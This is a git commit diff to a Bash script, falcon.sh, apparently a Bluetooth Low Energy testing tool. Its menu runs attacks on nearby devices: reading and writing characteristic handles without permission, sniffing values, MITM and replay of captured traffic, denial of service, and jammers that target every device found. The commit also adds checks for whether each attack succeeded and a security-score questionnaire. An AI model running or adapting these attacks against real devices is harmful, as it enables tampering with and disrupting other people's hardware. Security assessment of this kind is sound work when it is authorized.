799ceaef64bc88275b8705dcadc29cd951327518
dark-binary <debac@outlook.in>
2019-06-12 01:07:09 +1200

    Update falcon.sh

--- falcon.sh
+++ falcon.sh
@@ -6,7 +6,7 @@ w='\033[1;37m'
 nc='\033[0m'
 g='\033[0;32m'
 
-##############################################################################
+############################################################################################################################################################################
 
 echo -e ${w}
 
@@ -16,7 +16,8 @@ temp_hci=$(hciconfig | grep 'hci')
 
 echo "----------------------------"
 
-if [[ $temp_hci == hci* ]]; then
+if [[ $temp_hci == hci* ]]
+then
   echo -e "\nThe BLE adapter is connected."
 else
   echo -e "${r}Please connect the BLE adapter and try again.${w}"
@@ -32,21 +33,64 @@ fi
 sleep 1
 
 
-##############################################################################
+############################################################################################################################################################################
 
 dir=$(pwd)
+dir_check=$(ls | grep txtfiles)
+if [ -z dir_check ]
+then
+true
+else
+rm -rf txtfiles/
+fi
+
 mkdir txtfiles
+
+#Initialising values for scoring system
+
+att1_sev='none'
+att1_comp='none'
+  
+att2_sev='none'
+att2_comp='high'
+
+att3_sev='none'
+att3_comp='low'
+
+att4_sev='none'
+att4_comp='high'
+
+att5_sev='none'
+att5_comp='low'
+
 
 function ble_scan()
 {
 
 cd txtfiles/
+
+sudo hciconfig hci0 reset
 sudo hciconfig hci0 down
 sudo hciconfig hci0 up
-sudo hcitool lescan > tempscan.txt & sleep 2 2> /dev/null
-sleep 3
+sleep 1
+sudo hcitool lescan > tempscan.txt & sleep 2 
+#2> /dev/null
+echo -e "\n\n"
+echo -e "Scanning..."
+sleep 1
+echo -e "\n."
+sleep 1
+echo -e "\n."
+sleep 1
+echo -e "\n."
+sleep 1
+echo -e "\n\n"
+echo -e "Scan completed!"
+echo -e "\n\n"
+sleep 2
 #cat tempscan.txt
-sudo pkill hcitool 2> /dev/null
+
+
 
 #Removing first and last line
 sed '1,1d' tempscan.txt > tempscan1.txt
@@ -55,7 +99,9 @@ sed '$d' tempscan1.txt > tempscan.txt
 rm tempscan1.txt
 sort -u tempscan.txt > devicelist.txt
 sort -u tempscan.txt | awk '{print $1}' > address.txt
+sudo pkill hcitool 2> /dev/null
 cd ..
+
 
 }
 
@@ -68,7 +114,7 @@ cd ..
 
 }
 
-##############################################################################
+############################################################################################################################################################################
 
 
 echo -e "\n"
@@ -76,9 +122,10 @@ echo -e "\n"
 echo -e "\n"
 
 
-######################################################################################
-var=0;
-while [ $var -ne 8 ];
+############################################################################################################################################################################
+
+
+while true
 do
 
 
@@ -86,11 +133,12 @@ columns=$(tput cols)
 att1="[1] Illegal access      ( Write handles )"
 att2="[2] Sniffing            ( Value format  )"
 att3="[3] Write Values                         "
-att4="[4] Replay attack                        "
+att4="[4] MITM & Replay attack                 "
 att5="[5] Denial of Service                    "
 att6="[6] Ble Jammer 1                         "
 att7="[7] BLE Jammer 2                         "
-exit="[8] Exit                                 "
+att8="[8] Calculate Security score             "
+exit="[9] Exit                                 "
 
 printf "%*s\n" $(((${#att1}+$columns)/2)) "$att1"
 printf "%*s\n" $(((${#att2}+$columns)/2)) "$att2"
@@ -99,6 +147,7 @@ printf "%*s\n" $(((${#att4}+$columns)/2)) "$att4"
 printf "%*s\n" $(((${#att5}+$columns)/2)) "$att5"
 printf "%*s\n" $(((${#att6}+$columns)/2)) "$att6"
 printf "%*s\n" $(((${#att7}+$columns)/2)) "$att7"
+printf "%*s\n" $(((${#att8}+$columns)/2)) "$att8"
 printf "%*s\n" $(((${#exit}+$columns)/2)) "$exit"
 
 echo -e "\n\n"
@@ -106,8 +155,15 @@ echo -e -n "Enter your choice [] :  "
 read var
 sleep 1
 
+if ! [ "$var" -eq "$var" ] 2> /dev/null
+then
+  echo -e "\n\n"
+  echo "Please enter a valid input [1 - 9]"
+  echo -e "\n\n"
 
-######################################################################################
+else
+
+############################################################################################################################################################################
 
 #Illegal Access
 
@@ -120,6 +176,7 @@ then
   cd txtfiles/
   cat devicelist.txt
   echo -e "\n\n"
+
 
   echo -e -n "Enter the first 3 characters of the device you want to connect with :  "
   read att1_dev
@@ -163,21 +220,21 @@ then
   echo -e "Reading all the primary handles"
   echo -e "\n\n"
   for i in $(cat tempprimary.txt); do
-    temp_var=$(echo $i | grep -o "0x....")
-    if [ -z "$temp_var" ]
+    att1_temp_var=$(echo $i | grep -o "0x....")
+    if [ -z "$att1_temp_var" ]
     then
       true
     else
-      echo -e "\n Handle: $temp_var"
-      sudo gatttool -b $att1_addr --char-read -a $temp_var
+      echo -e "\n Handle: $att1_temp_var"
+      sudo gatttool -b $att1_addr --char-read -a $att1_temp_var
 
-      equation=$(sudo gatttool -b $att1_addr --char-read -a $temp_var 2>&1)
-      check=$(echo $equation | grep -o "Attribute can't be read")
-      if [ -z "$check" ]
+      att1_equation=$(sudo gatttool -b $att1_addr --char-read -a $att1_temp_var 2>&1)
+      att1_check=$(echo $att1_equation | grep -o "Attribute can't be read")
+      if [ -z "$att1_check" ]
       then
         true
       else
-        echo $temp_var > write_handles.txt
+        echo $att1_temp_var > write_handles.txt
       fi
 
       echo -e "\n\n"
@@ -191,17 +248,17 @@ then
   echo -e "Reading all the characteristics handles"
   echo -e "\n\n"
   for i in $(cat tempprimary.txt); do
-    temp_var=$(echo $i | grep -o "0x....")
-    if [ -z "$temp_var" ]
+    att1_temp_var=$(echo $i | grep -o "0x....")
+    if [ -z "$att1_temp_var" ]
     then
       true
     else
-      echo -e "\n Handle: $temp_var"
-      sudo gatttool -b $att1_addr --char-read -a $temp_var
+      echo -e "\n Handle: $att1_temp_var"
+      sudo gatttool -b $att1_addr --char-read -a $att1_temp_var
 
-      equation=$(sudo gatttool -b $att1_addr --char-read -a $temp_var 2>&1)
-      check=$(echo $equation | grep -o "Attribute can't be read")
-      if [ -z "$check" ]
+      att1_equation=$(sudo gatttool -b $att1_addr --char-read -a $att1_temp_var 2>&1)
+      att1_check=$(echo $att1_equation | grep -o "Attribute can't be read")
+      if [ -z "$att1_check" ]
       then
         true
       else
@@ -213,12 +270,22 @@ then
   done
 
   echo -e "${g}"
-  echo -e "\n\n"
-  echo -e "The write handles are,\n"
-  cat write_handles.txt
-  echo -e "\n\n"
-  echo -e "${w}"
+  if [ -s write_handles.txt ]
+  then
+    echo -e "\n\n"
+    echo -e "The write handles are,\n"
+    cat write_handles.txt
+    echo -e "\n\n"
+    att1_sev='low'
+  else
+    echo -e "\n\n"
+    echo -e "No write handles found!!\n"
+    echo -e "\n\n"
+    #att1_sev='none'
+  fi
 
+  echo -e "${w}"
+  
 
   cd ..
 
@@ -226,7 +293,7 @@ then
   clean_scanfiles
 
 
-######################################################################################
+############################################################################################################################################################################
 
 #Sniffing
 
@@ -245,6 +312,7 @@ then
     cat devicelist.txt
     echo -e "\n"
     echo -e "\n"
+
 
     echo -e -n "Enter the first 3 characters of the device you want to connect with :  "
     read att2_dev
@@ -271,8 +339,24 @@ then
     echo -e "\n\nThe captured file is stored as sniffed.pcap"
     tshark -V -r sniffed.pcap -Y btatt > dummy.txt
     echo -e "${g}"
-    echo -e "\n\nThe sniffed values are, \n"
-    grep '^    Value' dummy.txt
+
+
+
+    if [ -s dummy.txt ]
+    then
+      echo -e "\n\nThe sniffed values are, \n"
+      grep '^    Value' dummy.txt
+      echo -e "\n\n"
+      att2_sev='medium'
+    
+    else
+      echo -e "\n\n"
+      echo -e "No values found!!\n"
+      echo -e "\n\n"
+      #att2_sev='none'
+    fi
+
+    
     echo -e "${w}"
     cd ..
 
@@ -287,7 +371,7 @@ then
   fi
 
 
-######################################################################################
+############################################################################################################################################################################
 
 
 #Write Values
@@ -302,6 +386,7 @@ then
   cat devicelist.txt
   echo -e "\n"
   echo -e "\n"
+
 
   echo -e -n "Enter the first 3 characters of the device you want to connect with :  "
   read att3_dev
@@ -326,7 +411,25 @@ then
   echo -e -n "Enter an input value : "
   read att3_value
   echo -e "\n${g}"
-  sudo gatttool -i hci0 -b $att3_addr --char-write-req -a $att3_handle -n $att3_value
+  sudo gatttool -i hci0 -b $att3_addr --char-write-req -a $att3_handle -n $att3_value >> att3_check_file.txt
+  sudo gatttool -i hci0 -b $att3_addr --char-write-req -a $att3_handle -n $att3_value >> att3_check_file.txt
+  sudo gatttool -i hci0 -b $att3_addr --char-write-req -a $att3_handle -n $att3_value >> att3_check_file.txt
+  
+  att3_check=$(cat att3_check_file.txt | grep "successfully")
+  
+  if [ -z "$att3_check" ]
+  then
+    echo -e "\n\n"
+    echo -e "Error in writing the characteristic value, Try again :("
+    echo -e "\n\n"
+    #att3_sev='none'    
+  else
+    echo -e "\n\n"
+    echo -e "Characteristic value was written successfully"
+    echo -e "\n\n"
+    att3_sev='high'
+  fi
+
   echo -e "${w}"
 
   cd ..
@@ -336,12 +439,13 @@ then
 
 
 
-######################################################################################
+############################################################################################################################################################################
 
 elif [ $var -eq 4 ]
 then
 
   clear
+
 
   echo -e "\n\n"
   echo -e "${w}Make sure the slave machine is running                     <-------------------"
@@ -352,7 +456,7 @@ then
 
   echo -e "${w}Setting default address for BLE adapter"
   cd
-  cd Downloads/bdaddrtar/bdaddr/
+  cd $dir/bdaddr/
   make
   sudo ./bdaddr -i hci0 $defaultaddr
 
@@ -384,7 +488,7 @@ then
   echo -e "\n\n${w}"
 
   cd
-  cd $dir  cd ..
+  cd $dir
 
   #Performing BLE scan
   ble_scan
@@ -468,6 +572,21 @@ then
 
 
   echo -e "\n\n${w}"
+
+
+  cd dump
+  att4_mitm_check=$(ls | grep $replay_addr.log)
+  cd .. 
+  
+  if [ -z "$att4_mitm_check" ]
+  then
+    #att4_sev='none'
+    true    
+  else
+    att4_sev='medium'
+  fi
+
+
   read -p "Do you want to change the log file? (y/n) : " log_edit
 
   if [[ $log_edit == y ]]
@@ -484,11 +603,28 @@ then
 
   echo -e "\n\n"
 
-  sudo node replay.js -i dump/$replay_addr.log -p $replay_addr -s devices/$replay_srv
+  sudo node replay.js -i dump/$replay_addr.log -p $replay_addr -s devices/$replay_srv |& tee replay_output.txt
 
   echo -e "\n\n"
+  
+  att4_replay_check=$(cat replay_output.txt | grep 'WRITE REQ:')
 
-  echo -e "${g}Replay attack was successfull !!${w}"
+
+  if [ -z "$att4_replay_check" ]
+  then
+    echo -e "\n\n"
+    echo -e "${g}Replay attack was NOT successful.${w}"
+    echo -e "\n\n"
+    #att4_sev='none'    
+  else
+    echo -e "\n\n"
+    echo -e "${g}Replay attack was successful !!${w}"
+    echo -e "\n\n"
+    att4_sev='high'
+  fi
+
+
+  
 
   cd devices/
   rm -rf *
@@ -506,8 +642,7 @@ then
 
 
 
-
-######################################################################################
+############################################################################################################################################################################
 
 
 #DoS Attack
@@ -523,19 +658,32 @@ then
   echo -e "\n"
   echo -e "\n"
 
+
   echo -e -n "Enter the first 3 characters of the device you want to connect with:  "
   read att5_dev
   att5_addr=$(cat tempscan.txt | grep -m 1 $att5_dev | awk '{print $1}')
   cd ..
 
+  start=`date +%s`
   python test_dos.py $att5_addr
+  end=`date +%s`
 
+  runtime=$((end-start))
+  echo -e "\n"
+  
+  if [ $runtime -lt 10 ]
+  then
+    echo "The DoS attack was terminated in less than 10 seconds"
+  else
+    echo "The DoS attack was successful (more than 10 seconds)"
+    att5_sev='medium'
+  fi
 
   #clean the scan files
   clean_scanfiles
 
 
-######################################################################################
+############################################################################################################################################################################
 
 #BLE Jammer 1
 #DoS every available device
@@ -561,7 +709,7 @@ then
   #clean the scan files
   clean_scanfiles
 
-######################################################################################
+############################################################################################################################################################################
 
 #BLE Jammer 2
 
@@ -578,9 +726,91 @@ then
   rm  interfaces.txt
   cd ..
 
-######################################################################################
-#Exit
+############################################################################################################################################################################
+
+
+#Security score
+
+#Severity:
+#0. None    -  No loss
+#1. Low     -  If recon info on the device is accessible it is of low severity.
+#2. Medium  -  If a sensitive information is accessible it is of medium severity.
+#3. High    -  If the whole device could be controlled by the attacker it is of high severity.
+
+
+#Complexity:
+#0. None    -  None required
+#1. Low     -  If the attacker needs some pre requisite data or information to perform the attack.
+#2. Medium  -  If the attacker requires user's interaction to perform the attack.
+#3. High    -  If the attacker requires some specialized hardware to perform the attack (and the user's interaction).
+
+
 elif [ $var -eq 8 ]
+then
+  clear
+  echo -e "\n\n"
+  echo -e "	+------------------------------+------------------------+-------------------+"
+  echo -e "	|	Attacks		       |	Severity	|	Complexity  |"
+  echo -e "	+------------------------------+------------------------+-------------------+"
+  echo -e "	|	Illegal Access         |        $att1_sev		|	$att1_comp	    |"
+  echo -e "	|	Sniffing               |	$att2_sev		|	$att2_comp	    |"
+  echo -e "	|	Write Values           |	$att3_sev		|	$att3_comp	    |"
+  echo -e "	|	MITM & Replay attack   |	$att4_sev		|	$att4_comp	    |"
+  echo -e "	|	Denial of Service      |	$att5_sev		|	$att5_comp	    |"
+  echo -e "	+------------------------------+------------------------+-------------------+"
+  echo -e "\n\n"
+
+  echo -e "Input 'y' for YES, and 'n' for NO :"
+  echo -e "\n\n"
+
+  echo -e "\n1. User Authentication :"
+  echo -e "------------------------"
+  read -p "Does the device have an Authentication? " q1
+  read -p "Is the password strong enough? " q2
+  read -p "Is the device brute force protected? " q3
+  read -p "Does the device have multi-factor authentication? " q4
+
+  echo -e "\n2. User Authorization :"
+  echo -e "-----------------------"
+  read -p "Does the device have access control mechanisms? " q5
+  read -p "Does it have white listing for input requests? " q6
+
+  echo -e "\n3. Confidentiality :"
+  echo -e "--------------------" 
+  read -p "Is the data stored on the device encrypted? " q7
+  read -p "Is the communication encrypted / safe? " q8
+
+  echo -e "\n4. Integrity :"
+  echo -e "--------------"  
+  read -p "Are there any error checking methods? " q9
+  read -p "Are there any validation methods (Mutual authentication)? " q10
+
+  echo -e "\n5. Availability :"
+  echo -e "-----------------"
+  read -p "Is it resistant to logical tampering? " q11
+  read -p "Is it resistant to physical tampering? " q12
+
+  echo -e "\n6. Resilience :"
+  echo -e "---------------"
+  read -p "Is there any information leakage through non-administrative access? " q13
+  read -p "Can the device recover from a DoS attack automatically? " q14
+
+  echo -e "\n7. Accountability :"
+  echo -e "-------------------"
+  read -p "Is there any logging of data? " q15
+
+  echo -e "\n8. Non - repudiation :"
+  echo -e "----------------------"
+  read -p "Does the device have digital signature verification (replay attack)? " q16
+
+
+
+
+
+############################################################################################################################################################################
+
+#Exit
+elif [ $var -eq 9 ]
 then
   rm -rf txtfiles/
   pkill python
@@ -591,8 +821,15 @@ then
     clear
     exit 1
 
+############################################################################################################################################################################
+
+else
+  echo -e "\n\n"
+  echo -e "Please enter a valid input [ 1 - 9 ]"
+  echo -e "\n\n"
 fi
 
-######################################################################################
+fi
+############################################################################################################################################################################
 
 done
